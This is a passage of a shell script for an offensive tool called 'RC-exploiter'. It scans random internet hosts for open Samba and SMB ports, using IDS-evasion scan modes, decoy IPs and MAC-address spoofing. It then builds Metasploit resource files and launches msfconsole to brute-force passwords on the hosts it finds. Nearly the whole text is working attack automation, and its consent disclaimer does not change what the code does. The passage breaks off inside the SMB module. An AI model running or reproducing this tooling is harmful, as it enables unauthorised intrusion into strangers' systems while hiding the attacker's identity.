#!/bin/sh
### inicio
#
# [ RC-scanner/exploiter script ]
# codename: "the three stooges" goes shopping!...
# Develop By: pedr0 Ubuntu [r00t-3xp10it]
# peterubuntu10[at]sourceforge[dot]net
# WIKI: https://sourceforge.net/p/rcexploiter/wiki/Home/
# ---
# Required: Nmap,Metasploit,Macchanger,Zenity,Xterm installed...
# Special Thanks to: Milton@Barra for all the help provided
# in debugging and testing some of the modules in this project :D
# And Offcourse to: Fyodor(nmap) AND  hd moore(metasploit)
# ---
# This program is free software; you can redistribute it
# and/or modify it under the terms of the GNU General
# Public License as published by the Free Software Foundation.
#
###




# Resize terminal windows size befor running the tool (gnome terminal)
# Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
resize -s 46 92 > /dev/null




# ------------------------
# LOCAL VARIABLES SETTINGS
##############################################################################################################
IPATH=`pwd`                                                      # tool current install path                 #
ver="1.1.7"                                                      # script version develop                    #
OS=`uname`                                                       # grab OS - Linux or other                  #
HomE=`echo ~`                                                    # grab home directory                       #
user=`who | cut -d' ' -f1 | sort | uniq`                         # grab username in use                      #
DiStRo=`awk '{print $1}' /etc/issue`                             # grab distribution -  Ubuntu or Kali       #
InTeR=`netstat -r | grep "default" | awk {'print $8'}`           # grab interface in use - wlan0 or eth0     #
IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}`           # grab IP addr range                        #
GATE=`ip route | grep "static" | awk {'print $3'}`               # gab gateway                               #
PrOmPt=`cat $IPATH/settings | grep "PROMPT_DISPLAY" | cut -d '=' -f2` # chose diferente prompts              #
ClF=`cat $IPATH/settings | egrep -m 1 "CLEAR_LOG_FOLDER" | cut -d '=' -f2` # clean logs folder               #
ChE=`cat $IPATH/settings | grep "USE_DECOYS" | cut -d '=' -f2`    # turn 'on' or 'off' decoys                #
SPooF=`cat $IPATH/settings | grep "DECOY_IP_ADDR" | cut -d'=' -f2` # decoy ip addr (fake ip addr)            #
MaC=`cat $IPATH/settings | grep "SPOOF_MAC" | cut -d '=' -f2`     # change mac addr?                         #
RanDoM=`cat $IPATH/settings | grep "RANDOM" | cut -d '=' -f2`     # use change mac addr random or static     #
ToolMaC=`cat $IPATH/settings | grep "SPOOFED_MAC" | cut -d '=' -f2` # spoofed mac to use in static           #
nSeS=`cat $IPATH/settings | grep "NSE_SCRIPTS" | cut -d '=' -f2`  # nse script folder install path           #
nSeLib=`cat $IPATH/settings | grep "NSE_LIBRARIES" | cut -d '=' -f2` # nse LIB folder install path           #
r3P0=`cat $IPATH/settings | grep "GIT_REPO" | cut -d '=' -f2`     # tool git repository link                 #
OutPuT=`cat $IPATH/settings | grep "WRITE_LOGFILES" | cut -d '=' -f2` # output msf reports.log files         #
rDt="1.2.0"                     # version number of the old (not bugged) NetworkManager (macchanger funtion) #
VeRs=`NetworkManager -V`        # grab networkmanager current version installed (macchanger funtion)         #
##############################################################################################################



# -----------------------------------
# Colorise shell Script output leters
# -----------------------------------
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}




# -------------------------------------------
# check if dependencies are installed
# 'root' 'nmap' 'zenity' 'msfconsole' 'xterm'
# -------------------------------------------
Colors;

   # check if user is root
   if [ $(id -u) != "0" ]; then
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${BlueF}[Check User]:${RedF}$USER ${Reset};
     sleep 1
     echo ${RedF}[x]☠ [not root]${white}:you need to be ${GreenF}[root]${white} to run this script.${Reset};
     sleep 2
     exit

else

   echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${BlueF}[Check User]:${GreenF}$USER ${Reset};
   sleep 1

fi


   nM4p=`which nmap`
   #check if nmap exists
   if [ "$?" -eq "0" ]; then
   echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${BlueF}[Nmap]:${white}installation found...${Reset};
   sleep 1

else

   echo ${RedF}[x]☠ [warning]:this script require Nmap installed to work ${Reset};
   echo ${BlueF}[${YellowF}+${BlueF}]${white}☠ ${YellowF}[please wait]:${white}Downloading from network... ${Reset};
   sudo apt-get install nmap
   sudo apt-get install zenmap
   sleep 2
   clear
fi



   XtE=`which xterm`
   #check if xterm exists
   if [ "$?" -eq "0" ]; then
   echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${BlueF}[xterm]:${white}installation found...${Reset};
   sleep 1

else

   echo ${RedF}[x]☠ [warning]:this module required xterm instaled to work...${Reset};
   echo ${BlueF}[${YellowF}+${BlueF}]${white}☠ ${YellowF}[please wait]:${white}Downloading from network... ${Reset};
   sudo apt-get install xterm
   sleep 4
   exit
fi



   Z3n=`which zenity`
   #check if zenity exists
   if [ "$?" -eq "0" ]; then
   echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${BlueF}[zenity]:${white}installation found...${Reset};
   sleep 1

else

   echo ${RedF}[x]☠ [warning]:this module required 'zenity' instaled to work...${Reset};
   echo ${BlueF}[${YellowF}+${BlueF}]${white}☠ ${YellowF}[please wait]:${white}Downloading from network... ${Reset};
   sudo apt-get install zenity
   sleep 4
   exit
fi


   mSf=`which msfconsole`
   #check if metasploit exists
   if [ "$?" -eq "0" ]; then
   echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${BlueF}[Metasploit]:${white}installation found...${Reset};
   sleep 1

else

   echo ${RedF}[x]☠ [warning]:this module required Metasploit instaled to work...${Reset};
   echo ${BlueF}[${YellowF}+${BlueF}]${white}☠ ${YellowF}['more info' here]:${white}http://www.darkoperator.com/installing-metasploit-in-ubunt/ ${Reset};
   sleep 4
   exit
fi






# ----------------------------------
# grab network INTERFACE in use
# ----------------------------------
# ask to user if script as grab the currect interface in use
QuE=$(zenity --question --title "☠ INTERFACE IN USE ? ☠" --text "-:[ INTERFACE: $InTeR ? ]:-" --width 300) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then
       inter="$InTeR"

else

  # interface grab aborted by user
  echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${BlueF}[Available Network Interfaces]: ${Reset};
  echo ""
  netstat -i | grep "wlan"  && netstat -i | grep "eth"  && netstat -i | grep "ppp"  && netstat -i | grep "vboxnet"  && netstat -i | grep "pan" && netstat -i | grep "vmnet" && netstat -i | grep "lo"
  echo ""
  # INTERFACE user input
  inter=$(zenity --title="☠ Input interface in use ☠" --text "Please check your network connection\nOr manually input your interface in use\n\nexample: wlan0 OR eth0 OR vboxnet0" --entry --width 300) > /dev/null 2>&1

fi




# -----------------------------------------------
# change mac address depending of 'settings' file
# -----------------------------------------------
Colors;


  # check settings file and distro version installed
  if [ "$MaC" = "YES" ] && [ "$DiStRo" = "Ubuntu" ] || [ "$DiStRo" = "Mint" ]; then

    # check if macchanger exists
    m4cchanger=`which macchanger`
    if [ "$?" -eq "0" ]; then
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${BlueF}[macchanger]:${white}installation found...${Reset};
      sleep 2
      # bring interface down
      echo ${BlueF}[${YellowF}+${BlueF}]${white}☠ ${YellowF}[macchanger]:${white}Changing current mac address... ${Reset};
      service network-manager stop > /dev/null 2>&1
      sleep 3
      ifconfig $inter down > /dev/null 2>&1
      sleep 2

        # set mac random or stable 'depending of settings file'
        if [ "$RanDoM" = "YES" ]; then
          macchanger -r $inter | grep "Current" | zenity --title "☠ MAC ADDR CURRENT SETTINGS ☠" --text-info --width 420 > /dev/null 2>&1
        else
          macchanger --mac=$ToolMaC $inter | grep "Current" | zenity --title "☠ MAC ADDR CURRENT SETTINGS ☠" --text-info --width 420 > /dev/null 2>&1
          sleep 4
        fi

      # restarting network interface
      echo ${BlueF}[${YellowF}+${BlueF}]${white}☠ ${YellowF}[macchanger]:${white}Restarting [${GreenF}$inter${white}] interface... ${Reset};
      ifconfig $inter up > /dev/null 2>&1
      sleep 2
      service network-manager start > /dev/null 2>&1
      sleep 8

    else

      # macchanger installation not found
      echo ${RedF}[x]☠ [warning]:this module required 'macchanger' instaled to work...${Reset};
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${BlueF}[please wait]:${white}Downloading from network... ${Reset};
      sudo apt-get install macchanger macchanger-gtk
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${BlueF}[installed]:${YellowF}please run the script again... ${Reset};
      sleep 4
      exit
    fi


  # check settings file and distro version installed
  elif [ "$MaC" = "YES" ] && [ "$DiStRo" = "Kali" ] && [ $VeRs \> $rDt ]; then
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${BlueF}[NetworkManager9]:${white} version found... ${Reset};
    EsSiD=$(zenity --title="Input ESSID" --text "example: Gh0st-Ubuntu" --entry --width 300) > /dev/null 2>&1

      # bring interface down
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Stop network-manager... ${Reset};
      service network-manager stop > /dev/null 2>&1
      sleep 3
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Bring interface down... ${Reset};
      ifconfig $inter down > /dev/null 2>&1
      sleep 2

      # add cloned mac addr to network-manager
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Add Cloned mac address to NetworkManager... ${Reset};
      find "/etc/NetworkManager/system-connections/$EsSiD" -type f -exec sh -c "sed -i \"/^cloned-mac-address.*/d;/^\[wifi\]/a\cloned-mac-address=$ToolMaC\" \"{}\"" \;
      sleep 2

    # bring interface up
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Bring interface up... ${Reset};
    ifconfig $inter up > /dev/null 2>&1
    sleep 2
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Restart network-manager... ${Reset};
    service network-manager start > /dev/null 2>&1
    sleep 8
    fi






# -----------------------------------------------
# grab current mac address for display purposes..
# -----------------------------------------------
if [ "$MaC" = "YES" ] && [ "$DiStRo" = "Kali" ]; then
  st=`ifconfig $inter | grep "ether" | awk {'print $2'}`
elif [ "$MaC" = "YES" ] && [ "$DiStRo" = "Ubuntu" ] || [ "$DiStRo" = "Mint" ] || [ "$DiStRo" = "Parrot" ]; then
  st=`ifconfig $inter | grep "HWaddr" | awk {'print $5'}`
else
  st="NOT CONFIGURATED..."
fi




# ---------------------------------------------
# grab Operative System distro to store IP addr
# output = Ubuntu OR Kali OR Parrot OR BackBox
# ---------------------------------------------
case $DiStRo in
    Kali) IP=`ifconfig $inter | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $inter | egrep -w "inet" | awk '{print $2}'`;;
    Ubuntu) IP=`ifconfig $inter | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    Parrot) IP=`ifconfig $inter | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    BackBox) IP=`ifconfig $inter | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Input your IP addr ☠" --text "example: 192.168.1.68" --entry --width 300`;;
  esac
clear




# -----------------------
# banner/disclamer
# -----------------------
Colors;
clear
cat << !
                                 ,.,
 +-+-+  +-+-+-+-+-+-+-+-+-+     (~ ~)
 |r|c|  |e|x|p|l|o|i|t|e|r|    q:0 0:p
 +-+-+  +-+-+-+-+-+-+-+-+-+     ((_))
                                 'u'
!
echo ${YellowF} The author does not hold any responsibility about the bad use of this script,${Reset};
echo ${YellowF} remmenber that attacking targets without prior concent its illegal and punish${Reset};
echo ${YellowF} by law, this script as build to show how msf resource files can automate tasks.${Reset};
echo ""
echo ${YellowF} Scanning WAN networks In search of targets may take 10 to 15 minutes depending${Reset};
echo ${YellowF} of your network connection, and will search In 1024 random hosts For the selected${Reset};
echo ${YellowF} port, also the File 'user-names.txt' may be edited to insert new entrys, or we can${Reset};
echo ${YellowF} provide the full path to another dicionary File to be used In brute-force services.${Reset};
echo ${YellowF} Also this tool will change your [${white}mac address + ip address${YellowF}] and use [${white}Decoys${YellowF}] to${Reset};
echo ${YellowF} scan WAN networks 'if' configurated 'in' the [${white}settings${YellowF}] conf 'file'... ${Reset};
echo ""
echo ${RedF} Author':' ${GreenF}r00t-3xp10it${RedF} '|' Suspicious Shell Activity Labs/RedTeam${Reset};
echo ${RedF} r00tsect0r '|' dwebcrew '|' google inurlbr '|' root developers ${Reset};
echo ${RedF} Learn 'more' about Resource Files here${white}:${RedF}http://goo.gl/chSnOC ${Reset};
echo ${RedF} VERSION:${white}$ver ${RedF}USER:${white}$user ${RedF}INTERFACE:${white}$inter ${RedF}OS:${white}$OS ${RedF}DISTRO:${white}$DiStRo ${Reset};
echo ""
echo ${YellowF}Press [${GreenF}ENTER${YellowF}] to continue...${Reset};
read op




# -----------------------
# Obfuscated ...
# -----------------------
if [ -e $IPATH/bin/.obfuscated ]; then
ob=YES
# use base64 to decode password string
oBf=`cat $IPATH/bin/.obfuscated | base64 -d`
P0C=$(zenity --password --title="☠ RC-EXPLOITER $ver ☠" --text "enter your access password:") > /dev/null 2>&1
  if [ "$P0C" = "$oBf" ]; then
  echo "good" > /dev/null 2>&1
  else
  clear
cat << !


             (=('~')=)
            ,))|o o|((,
               ((_))
                '-'

!
dtr=`date | awk '{print $2,$3,$4}'`
echo ${white}Wrong password:${RedF}"'$P0C'" ${white}Better luck next time...${Reset};
echo ${white}Develop by:[${GreenF}r00t-3xp10it${white}]SSA-RedTeam@2016 ☠ ${Reset};
echo ${YellowF}"'If you can crack it, then you deserve to use it'"...${Reset};
exit
fi


else
# if dont exist 'obfuscated' file (default) continue...
echo "good" > /dev/null 2>&1
ob=NO
fi



# ---------------------------------------------------
# setting nmap default User-agent to send (http.lua):
# ---------------------------------------------------
echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Please wait, setting nmap [${GreenF}User-agent${white}] ${Reset};
cp $nSeLib/http.lua $nSeLib/http.bk > /dev/null 2>&1
cp $IPATH/bin/http.lua $nSeLib/http.lua
# update nmap database rules
nmap --script-updatedb > /dev/null 2>&1



# ------------------------------------
# start metasploit/postgresql services
# ------------------------------------
if [ "$DiStRo" = "Kali" ]; then
/etc/init.d/postgresql start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
elif [ "$DiStRo" = "Ubuntu" ]; then
service metasploit start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting metasploit services" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
elif [ "$DiStRo" = "Parrot" ]; then
service metasploit start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting metasploit services" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
service postgresql start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
else
/etc/init.d/metasploit start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting metasploit services" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi
clear




# ----------------------------------
# bash trap ctrl-c and call ctrl_c()
# ----------------------------------
trap ctrl_c INT
ctrl_c() {
Colors;

        echo ${RedF}[x]☠ ${YellowF}You have pressed ${RedF}[CTRL+C] ${Reset};
        echo ${RedF}[x]☠ ${YellowF}Please Wait, cleanning ... ${Reset};
        sleep 2
      sh_exit
}




# ----------------------------------
# END OF CONFIGURATIONS
# ----------------------------------



















# -----------------------
# samba exploiter
# -----------------------
sh_1 () {
Colors;
# search in wan OR manually input rhosts
aTv=$(zenity --list --title "☠ ATTACK VECTOR ☠" --text "Available scans" --radiolist --column "Pick" --column "Option" TRUE "Scan WAN for hosts" FALSE "input RHOSTS manually" --width 350 --height 165) > /dev/null 2>&1
# sellect IDS evading port scanning technic to use ...
IdS=$(zenity --list --title "☠ IDS EVADING TECHNIC ☠" --text "\nAvailable port scans:" --radiolist --column "Pick" --column "Option" TRUE "TCP Stealth scan (default)" FALSE "TCP Null Scan" FALSE "TCP Fin scan" FALSE "TCP Xmas scan" FALSE "fragmented packets" --width 320 --height 270) > /dev/null 2>&1

# IDS evading port scanning technic to use
if [ "$IdS" = "TCP Stealth scan (default)" ]; then
  IdS="-sS"
elif [ "$IdS" = "TCP Null Scan" ]; then
  IdS="-sN"
elif [ "$IdS" = "TCP Fin scan" ]; then
  IdS="-sF"
elif [ "$IdS" = "TCP Xmas scan" ]; then
  IdS="-sX"
elif [ "$IdS" = "fragmented packets" ]; then
  IdS="-f"
fi


   if [ "$aTv" = "Scan WAN for hosts" ]; then
     NUM=$(zenity --title "☠ Nº LIMIT OF HOSTS TO FOUND ☠" --text "Input the maximus nunber of random IP's to found\nChose from 1 to 1024 random hosts to found" --entry --width 350) > /dev/null 2>&1
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/user-passw.txt") > /dev/null 2>&1

     # use DECOY'S in scanning WAN networks?
     if [ "$ChE" = "YES" ]; then
     # use decoys to scan wan networks
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -D $SPooF,$IP -PN -n -p 139,445,161 --open --reason -oN $IPATH/logs/Random-Hosts[samba].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 139,445,161\nLOGFILE: Random-Hosts[samba].log\nUSING DECOY: $SPooF\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     else
     # default (dont use decoys)
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -PN -n -p 139,445,161 --open --reason -oN $IPATH/logs/Random-Hosts[samba].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 139,445,161\nLOGFILE: Random-Hosts[samba].log\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     fi

     echo ""
     cat $IPATH/logs/Random-Hosts[samba].log
     echo ""

       # generate (settings) resource file
       rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
       if [ "$?" -eq "0" ]; then
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
       sleep 1

       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
       echo "setg PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
       echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
       echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc


       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[samba].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/samba.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/logs/Random-Hosts[samba].log > /dev/null 2>&1
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1


           cd $IPATH/exploits/
           # using bash SED to replace values in exploit.rc
           cp samba.rc samba.bk > /dev/null 2<&1
           sed -i "s|FlAg|$IdS|g" samba.rc
           sed -i "s|R3PL4C3|$dIc|g" samba.rc
           cd $IPATH


       # start postgresql+metasploit db
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
       sleep 1
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
       sleep 1


    # run metasploit
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[samba].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/samba.bk $IPATH/exploits/samba.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/samba.rc > /dev/null 2>&1


  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi



   elif [ "$aTv" = "input RHOSTS manually" ]; then
  # imput manually RHOSTS
  rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/user-passw.txt") > /dev/null 2>&1

     # generate (settings) resource file
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
     sleep 1
     echo "hosts -d" > $IPATH/db/msfdb.rc
     echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
     echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
     echo "setg PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
     echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
     echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
     echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
     echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[samba].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

     echo "resource $IPATH/exploits/samba.rc" >> $IPATH/db/msfdb.rc
     chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1

           cd $IPATH/exploits/
           # using bash SED to replace values in exploit.rc
           cp samba.rc samba.bk > /dev/null 2<&1
           sed -i "s|FlAg|$IdS|g" samba.rc
           sed -i "s|R3PL4C3|$dIc|g" samba.rc
           cd $IPATH


      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # run metasploit
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[samba].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/samba.bk $IPATH/exploits/samba.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/samba.rc > /dev/null 2>&1


  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


else

   Colors;
   echo ${RedF}[x]☠ quiting module... ${Reset};
   sleep 2
fi
}






# -----------------------
# netbios (smb) exploiter
# -----------------------
sh_2 () {
Colors;
# search in wan OR manually input rhosts
aTv=$(zenity --list --title "☠ ATTACK VECTOR ☠" --text "Available scans" --radiolist --column "Pick" --column "Option" TRUE "Scan WAN for hosts" FALSE "input RHOSTS manually" --width 350 --height 165) > /dev/null 2>&1
# sellect IDS evading port scanning technic to use ...
IdS=$(zenity --list --title "☠ IDS EVADING TECHNIC ☠" --text "\nAvailable port scans:" --radiolist --column "Pick" --column "Option" TRUE "TCP Stealth scan (default)" FALSE "TCP Null Scan" FALSE "TCP Fin scan" FALSE "TCP Xmas scan" FALSE "fragmented packets" --width 320 --height 270) > /dev/null 2>&1

# IDS evading port scanning technic to use
if [ "$IdS" = "TCP Stealth scan (default)" ]; then
  IdS="-sS"
elif [ "$IdS" = "TCP Null Scan" ]; then
  IdS="-sN"
elif [ "$IdS" = "TCP Fin scan" ]; then
  IdS="-sF"
elif [ "$IdS" = "TCP Xmas scan" ]; then
  IdS="-sX"
elif [ "$IdS" = "fragmented packets" ]; then
  IdS="-f"
fi


   if [ "$aTv" = "Scan WAN for hosts" ]; then
     NUM=$(zenity --title "☠ Nº LIMIT OF HOSTS TO FOUND ☠" --text "Input the maximus nunber of random IP's to found\nChose from 1 to 1024 random hosts to found" --entry --width 350) > /dev/null 2>&1
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/user-passw.txt") > /dev/null 2>&1

     # use DECOY'S in scanning WAN networks?
     if [ "$ChE" = "YES" ]; then
     # use decoys to scan wan networks
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -D $SPooF,$IP -PN -n -p 137,139,445 --open --reason -oN $IPATH/logs/Random-Hosts[smb].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 137,139,445\nLOGFILE: Random-Hosts[smb].log\nUSING DECOY: $SPooF\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     else
     # default (dont use decoys)
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -PN -n -p 137,139,445 --open --reason -oN $IPATH/logs/Random-Hosts[smb].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 137,139,445\nLOGFILE: Random-Hosts[smb].log\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     fi

     echo ""
     cat $IPATH/logs/Random-Hosts[smb].log
     echo ""

       # generate (settings) resource file
       rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
       if [ "$?" -eq "0" ]; then
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
       sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
       echo "setg PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
       echo "setg USER_FILE $dIc" >> $IPATH/db/msfdb.rc
       echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
       echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[smb].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/smb.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/logs/Random-Hosts[smb].log > /dev/null 2>&1
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1

           cd $IPATH/exploits/
           # using bash SED to replace values in exploit.rc
           cp smb.rc smb.bk > /dev/null 2<&1
           sed -i "s|FlAg|$IdS|g" smb.rc
           cd $IPATH


       # start postgresql+metasploit db
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
       sleep 1
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
       sleep 1


    # runmetasploit
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[smb].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/smb.bk $IPATH/exploits/smb.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/smb.rc > /dev/null 2>&1


  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi



   elif [ "$aTv" = "input RHOSTS manually" ]; then
  # imput manually RHOSTS
  rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/user-passw.txt") > /dev/null 2>&1

     # generate (settings) resource file
